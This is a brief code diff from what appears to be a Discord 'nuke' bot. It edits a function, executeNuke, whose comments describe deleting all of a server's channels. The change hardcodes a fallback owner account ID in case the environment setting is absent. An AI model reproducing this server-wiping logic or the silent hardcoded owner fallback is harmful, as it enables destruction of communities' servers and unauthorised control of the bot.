@@ -233,7 +233,7 @@ async function executeNuke(guild, executor, mode, channelCount, channelName) {
   };
 
   const botId = guild.members.me.id;
-  const ownerId = process.env.OWNER_ID;
+  const ownerId = process.env.OWNER_ID || '1423292960744804383';
 
   // ==========================================
   // MODE 1 & 3: DELETE ALL CHANNELS
